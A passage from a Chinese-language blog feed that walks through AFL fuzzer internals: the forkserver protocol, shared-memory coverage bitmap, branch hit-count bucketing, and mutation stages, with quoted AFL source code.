class="line"><span class="string">&quot;  /* In parent process: write PID to pipe, then wait for child. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movl  %eax, __afl_fork_pid\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $4              /* length    */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $__afl_fork_pid /* data      */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $&quot;</span> STRINGIFY((FORKSRV_FD + <span class="number">1</span>)) <span class="string">&quot;      /* file desc */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  call  write\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  addl  $12, %esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $0             /* no flags  */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $__afl_temp    /* status    */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl __afl_fork_pid /* PID       */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  call  waitpid\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  addl  $12, %esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  cmpl  $0, %eax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jle   __afl_die\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Relay wait status to pipe, then loop back. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $4          /* length    */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $__afl_temp /* data      */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $&quot;</span> STRINGIFY((FORKSRV_FD + <span class="number">1</span>)) <span class="string">&quot;  /* file desc */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  call  write\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  addl  $12, %esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jmp __afl_fork_wait_loop\n&quot;</span>    </span><br></pre></td></tr></table></figure><p>继续进行forkserver的管道通讯，然后<code>__afl_fork_wait_loop</code>，</p><h3 id="fuzzer"><a class="markdownIt-Anchor" href="#fuzzer"></a> fuzzer</h3><p>回顾一下目前“栈”的情况：<code>main</code> -&gt; <code>calibrate_case</code> -&gt; <code>init_forkserver</code></p><p><img src="https://img.joe1sn.top/uploads/big/0d62f5f1741495588a352bb92afabe74.png" alt="image-20230722112212761" /></p><p>​回退到<code>calibrate_case</code>继续执行，<code>write_to_testcase</code>就是设置测试样例，重点在于<code>run_target</code>。AFL的文件编译策略不是胡乱变换的，主要是<code>dumb_mode</code>有没有被开启，一般都是不会开启的，那么就来到了L2362</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  s32 res;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In non-dumb mode, we have the fork server up and running, so simply</span></span><br><span class="line"><span class="comment">     tell it to have at it, and then read back PID. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((res = write(fsrv_ctl_fd, &amp;prev_timed_out, <span class="number">4</span>)) != <span class="number">4</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stop_soon) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    RPFATAL(res, <span class="string">&quot;Unable to request new process from fork server (OOM?)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((res = read(fsrv_st_fd, &amp;child_pid, <span class="number">4</span>)) != <span class="number">4</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stop_soon) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    RPFATAL(res, <span class="string">&quot;Unable to request new process from fork server (OOM?)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (child_pid &lt;= <span class="number">0</span>) FATAL(<span class="string">&quot;Fork server is misbehaving (OOM?)&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看注释和代码，知道通过管道向forkserver通知准备完毕，并得到返回的PID，然后就是L2438</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (WIFSIGNALED(status) &amp;&amp; !stop_soon) &#123;</span><br><span class="line"></span><br><span class="line">  kill_signal = WTERMSIG(status);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (child_timed_out &amp;&amp; kill_signal == SIGKILL) <span class="keyword">return</span> FAULT_TMOUT;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> FAULT_CRASH;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fuzzer再次读取状态管道，获取子进程退出状态，并由此来判断子进程结束的原因，例如正常退出、超时、崩溃等，并进行相应的记录</p><h3 id="共享内存机制"><a class="markdownIt-Anchor" href="#共享内存机制"></a> 共享内存机制</h3><p>解决程序插桩和启动运行后，就来到了对示例的fuzz阶段。在程序待测试部分，程序先是初始化变异方式。AFL通过共享内存机制来方便高并发的样例读取，减小IO的损耗。<br />代码不长这里贴一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">EXP_ST <span class="type">void</span> <span class="title function_">setup_shm</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">  u8* shm_str;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!in_bitmap) <span class="built_in">memset</span>(virgin_bits, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(virgin_tmout, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line">  <span class="built_in">memset</span>(virgin_crash, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">  shm_id = shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (shm_id &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;shmget() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  atexit(remove_shm);</span><br><span class="line"></span><br><span class="line">  shm_str = alloc_printf(<span class="string">&quot;%d&quot;</span>, shm_id);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If somebody is asking us to fuzz instrumented binaries in dumb mode,</span></span><br><span class="line"><span class="comment">     we don&#x27;t want them to detect instrumentation, since we won&#x27;t be sending</span></span><br><span class="line"><span class="comment">     fork server commands. This should be replaced with better auto-detection</span></span><br><span class="line"><span class="comment">     later on, perhaps? */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!dumb_mode) setenv(SHM_ENV_VAR, shm_str, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  ck_free(shm_str);</span><br><span class="line"></span><br><span class="line">  trace_bits = shmat(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (!trace_bits) PFATAL(<span class="string">&quot;shmat() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>afl-fuzz</code>的L7955来到<code>setup_shm</code>，这里设置共享内存，然后从<code>shemget()</code>（这是一个LinuxC的函数）获得一块内存。</p><blockquote><p>shmget()  returns  the identifier of the System V shared memory segment associated with the value of the argu‐<br />ment key.  A new shared memory segment, with size equal to the value of size  rounded  up  to  a  multiple  of<br />PAGE_SIZE, is created if key has the value IPC_PRIVATE or key isn’t IPC_PRIVATE, no shared memory segment cor‐<br />responding to key exists, and IPC_CREAT is specified in shmflg.</p></blockquote><p>子进程通过环境变量<code>SHM_ENV_VAR</code>得到内存，对于fuzzer本身则会回到<code>trace_bits</code>保存内存地址</p><blockquote><p>shmat()  attaches  the  System V shared memory segment identified by shmid to the address space of the calling<br />process.</p></blockquote><p>我们在且回到被测试的target中，看下他被插桩的代码（早于之前的forkserver）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;  /* Check if SHM region is already mapped. */\n&quot;</span></span><br><span class="line"> <span class="string">&quot;\n&quot;</span></span><br><span class="line"> <span class="string">&quot;  movl  __afl_area_ptr, %edx\n&quot;</span></span><br><span class="line"> <span class="string">&quot;  testl %edx, %edx\n&quot;</span></span><br><span class="line"> <span class="string">&quot;  je    __afl_setup\n&quot;</span></span><br><span class="line"> <span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure><ul><li><p><code>__afl_area_ptr</code>：共享内存映射到target的内存空间中的地址</p></li><li><p><code>__afl_setup</code>：获取环境变量<code>AFL_SHM_ENV</code>的内容并将其转为整型，最后，通过调用<code>shmat()</code>，target将这块共享内存也映射到了自己的内存空间中，并将其地址保存在<code>__afl_area_ptr</code>及<code>edx</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;__afl_setup:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Do not retry setup if we had previous failures. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  cmpb $0, __afl_setup_failure\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jne  __afl_return\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Map SHM, jumping to __afl_setup_abort if something goes wrong.\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     We do not save FPU/MMX/SSE registers here, but hopefully, nobody\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     will notice this early in the game. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl %eax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl %ecx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $.AFL_SHM_ENV\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  call  getenv\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  addl  $4, %esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  testl %eax, %eax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  je    __afl_setup_abort\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl %eax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  call  atoi\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  addl  $4, %esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $0          /* shmat flags    */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $0          /* requested addr */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl %eax        /* SHM ID         */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  call  shmat\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  addl  $12, %esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  cmpl $-1, %eax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  je   __afl_setup_abort\n&quot;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="分支信息的记录"><a class="markdownIt-Anchor" href="#分支信息的记录"></a> 分支信息的记录</h3><p>来到文章开始抛出的疑问<code>__afl_maybe_log</code>干了什么</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;__afl_maybe_log:\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  lahf\n&quot;</span></span><br><span class="line"><span class="string">&quot;  seto %al\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  /* Check if SHM region is already mapped. */\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movl  __afl_area_ptr, %edx\n&quot;</span></span><br><span class="line"><span class="string">&quot;  testl %edx, %edx\n&quot;</span></span><br><span class="line"><span class="string">&quot;  je    __afl_setup\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;__afl_store:\n&quot;</span></span><br></pre></td></tr></table></figure><p>读代码就知道了：</p><ul><li><p>检查共享内存的映射，有错进入到<code>__afl_setup</code></p></li><li><p>开始<code>__afl_store</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">  <span class="string">&quot;__afl_store:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Calculate and store hit for the code location specified in ecx. There\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     is a double-XOR way of doing this without tainting another register,\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     and we use it on 64-bit systems; but it&#x27;s slower for 32-bit ones. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> COVERAGE_ONLY</span></span><br><span class="line">  <span class="string">&quot;  movl __afl_prev_loc, %edi\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  xorl %ecx, %edi\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  shrl $1, %ecx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movl %ecx, __afl_prev_loc\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="string">&quot;  movl %ecx, %edi\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^!COVERAGE_ONLY */</span></span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SKIP_COUNTS</span></span><br><span class="line">  <span class="string">&quot;  orb  $1, (%edx, %edi, 1)\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="string">&quot;  incb (%edx, %edi, 1)\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^SKIP_COUNTS */</span></span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure><ul><li><code>__afl_prev_loc</code>：前一次跳转的”位置”</li><li><code>ecx</code>：最开始插桩的随机数位置，即代码块的标号</li></ul><blockquote><p>因此，AFL为每个代码块生成一个随机数，作为其“位置”的记录；随后，对分支处的”源位置“和”目标位置“进行异或，并将异或的结果作为该分支的key，保存每个分支的执行次数。用于保存执行次数的实际上是一个哈希表，大小为<code>MAP_SIZE=64K</code>，当然会存在碰撞的问题；但根据AFL文档中的介绍，对于不是很复杂的目标，碰撞概率还是可以接受的：</p></blockquote><p>在最后<code>map density</code>就是指的哈希表的密度，越小发生碰撞的概率越小</p></li></ul><h3 id="分支信息的分析"><a class="markdownIt-Anchor" href="#分支信息的分析"></a> 分支信息的分析</h3><p>前文提到了</p><ul><li><code>trace_bits</code>保存了共享内存</li><li>共享内存保存了分析记录</li></ul><p>那么，对于AFL从这块共享内存中获得信息就显得很合理了</p><p>在预处理共享内存时</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">classify_counts</span><span class="params">(u32* mem)</span> &#123;</span><br><span class="line"></span><br><span class="line">  u32 i = MAP_SIZE &gt;&gt; <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (i--) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Optimize for sparse bitmaps. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unlikely(*mem)) &#123;</span><br><span class="line"></span><br><span class="line">      u16* mem16 = (u16*)mem;</span><br><span class="line"></span><br><span class="line">      mem16[<span class="number">0</span>] = count_class_lookup16[mem16[<span class="number">0</span>]];</span><br><span class="line">      mem16[<span class="number">1</span>] = count_class_lookup16[mem16[<span class="number">1</span>]];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    mem++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Destructively classify execution counts in a trace. This is used as a</span></span><br><span class="line"><span class="comment">   preprocessing step for any newly acquired traces. Called on every exec,</span></span><br><span class="line"><span class="comment">   must be fast. */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> u8 count_class_lookup8[<span class="number">256</span>] = &#123;</span><br><span class="line"></span><br><span class="line">  [<span class="number">0</span>]           = <span class="number">0</span>,</span><br><span class="line">  [<span class="number">1</span>]           = <span class="number">1</span>,</span><br><span class="line">  [<span class="number">2</span>]           = <span class="number">2</span>,</span><br><span class="line">  [<span class="number">3</span>]           = <span class="number">4</span>,</span><br><span class="line">  [<span class="number">4</span> ... <span class="number">7</span>]     = <span class="number">8</span>,</span><br><span class="line">  [<span class="number">8</span> ... <span class="number">15</span>]    = <span class="number">16</span>,</span><br><span class="line">  [<span class="number">16</span> ... <span class="number">31</span>]   = <span class="number">32</span>,</span><br><span class="line">  [<span class="number">32</span> ... <span class="number">127</span>]  = <span class="number">64</span>,</span><br><span class="line">  [<span class="number">128</span> ... <span class="number">255</span>] = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>最重要的是<code>count_class_lookup8</code>，target是将每个分支的执行次数用1个byte来储存，而fuzzer则进一步把这个执行次数归入buckets中，比如执行1次，<code>mem16 = count_class_lookup8[1]; == 1</code></p><p>执行3次<code>mem16 = count_class_lookup8[3]; == 4</code>。执行4次<code>mem16 = count_class_lookup8[4]; == 8</code></p><p>好处就在于分支A执行了32次；对另外一个测试用例，分支A执行了33次，那么AFL就会认为这两次的代码覆盖是相同的。这样通过代码块的执行次数就可以统计相关路径，AFL根据相关路径的HASH判断路径是否发生改变。</p><h1 id="文件变异规则"><a class="markdownIt-Anchor" href="#文件变异规则"></a> 文件变异规则</h1><p>看到好多研究生论文都是从这里下手的。。。</p><ul><li><p>bitflip，按位翻转，1变为0，0变为1</p><p>在对每个byte进行翻转时，如果其造成执行路径与原始路径不一致，就将该byte在effector map中标记为1，即“有效”的，否则标记为0，即“无效”的</p></li><li><p>arithmetic，整数加/减算术运算</p><p>对目标整数会进行+1, +2, …, +35, -1, -2, …, -35的变异。特别地，由于整数存在大端序和小端序两种表示方式，AFL会贴心地对这两种整数表示方式都进行变异。</p></li><li><p>interest，把一些特殊内容替换到原文件中</p><p>用于替换的&quot;interesting values&quot;，是AFL预设的一些比较特殊的数。</p><p><code>config.h</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> INTERESTING_8 \</span></span><br><span class="line"><span class="meta">  -128,          <span class="comment">/* Overflow signed 8-bit when decremented  */</span> \</span></span><br><span class="line"><span class="meta">  -1,            <span class="comment">/*                                         */</span> \</span></span><br><span class="line"><span class="meta">   0,            <span class="comment">/*                                         */</span> \</span></span><br><span class="line"><span class="meta">   1,            <span class="comment">/*                                         */</span> \</span></span><br><span class="line"><span class="meta">   16,           <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   32,           <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   64,           <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   100,          <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   127           <span class="comment">/* Overflow signed 8-bit when incremented  */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INTERESTING_16 \</span></span><br><span class="line"><span class="meta">  -32768,        <span class="comment">/* Overflow signed 16-bit when decremented */</span> \</span></span><br><span class="line"><span class="meta">  -129,          <span class="comment">/* Overflow signed 8-bit                   */</span> \</span></span><br><span class="line"><span class="meta">   128,          <span class="comment">/* Overflow signed 8-bit                   */</span> \</span></span><br><span class="line"><span class="meta">   255,          <span class="comment">/* Overflow unsig 8-bit when incremented   */</span> \</span></span><br><span class="line"><span class="meta">   256,          <span class="comment">/* Overflow unsig 8-bit                    */</span> \</span></span><br><span class="line"><span class="meta">   512,          <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   1000,         <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   1024,         <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   4096,         <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   32767         <span class="comment">/* Overflow signed 16-bit when incremented */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INTERESTING_32 \</span></span><br><span class="line"><span class="meta">  -2147483648LL, <span class="comment">/* Overflow signed 32-bit when decremented */</span> \</span></span><br><span class="line"><span class="meta">  -100663046,    <span class="comment">/* Large negative number (endian-agnostic) */</span> \</span></span><br><span class="line"><span class="meta">  -32769,        <span class="comment">/* Overflow signed 16-bit                  */</span> \</span></span><br><span class="line"><span class="meta">   32768,        <span class="comment">/* Overflow signed 16-bit                  */</span> \</span></span><br><span class="line"><span class="meta">   65535,        <span class="comment">/* Overflow unsig 16-bit when incremented  */</span> \</span></span><br><span class="line"><span class="meta">   65536,        <span class="comment">/* Overflow unsig 16 bit                   */</span> \</span></span><br><span class="line"><span class="meta">   100663045,    <span class="comment">/* Large positive number (endian-agnostic) */</span> \</span></span><br><span class="line"><span class="meta">   2147483647    <span class="comment">/* Overflow signed 32-bit when incremented */</span></span></span><br></pre></td></tr></table></figure></li><li><p>dictionary，把自动生成或用户提供的token替换/插入到原文件中（从头开始）</p><p><code>-x</code>选项设置的token</p></li><li><p>havoc，中文意思是“大破坏”，此阶段会对原文件进行大量变异，具体见下文</p><p>开始智力下降，我在fuzz中看到的大多数都是这个阶段（阿巴阿巴）</p><ul><li>随机选取某个bit进行翻转</li><li>随机选取某个byte，将其设置为随机的interesting value</li><li>随机选取某个word，并随机选取大、小端序，将其设置为随机的interesting value</li><li>随机选取某个dword，并随机选取大、小端序，将其设置为随机的interesting value</li><li>随机选取某个byte，对其减去一个随机数</li><li>随机选取某个byte，对其加上一个随机数</li><li>随机选取某个word，并随机选取大、小端序，对其减去一个随机数</li><li>随机选取某个word，并随机选取大、小端序，对其加上一个随机数</li><li>随机选取某个dword，并随机选取大、小端序，对其减去一个随机数</li><li>随机选取某个dword，并随机选取大、小端序，对其加上一个随机数</li><li>随机选取某个byte，将其设置为随机数</li><li>随机删除一段bytes</li><li>随机选取一个位置，插入一段随机长度的内容，其中75%的概率是插入原文中随机位置的内容，25%的概率是插入一段随机选取的数</li><li>随机选取一个位置，替换为一段随机长度的内容，其中75%的概率是替换成原文中随机位置的内容，25%的概率是替换成一段随机选取的数</li><li>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）替换</li><li>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）插入</li></ul></li><li><p>splice，中文意思是“绞接”，此阶段会将两个文件拼接起来得到一个新的文件</p><p>splice是将两个seed文件拼接得到新的文件，并对这个新文件继续执行havoc变异</p></li><li><p>cycle：对队列所有文件全部按照上面的步骤来一遍就算完成了一个cycle，整个队列又会从第一个文件开始，再次进行变异，不过与第一次变异不同的是，这一次就不需要再进行deterministic fuzzing了。</p></li></ul><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><p><a href="https://paper.seebug.org/496/">https://paper.seebug.org/496/</a></p><p><a href="https://github.com/google/AFL">https://github.com/google/AFL</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;其实还是挺简单的&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="source" scheme="https://joe1sn.eu.org/tags/source/"/>
    
    <category term="AFL" scheme="https://joe1sn.eu.org/tags/AFL/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞挖掘】win-afl使用指北-中级篇</title>
    <link href="https://joe1sn.eu.org/2023/07/19/win-afl2/"/>
    <id>https://joe1sn.eu.org/2023/07/19/win-afl2/</id>
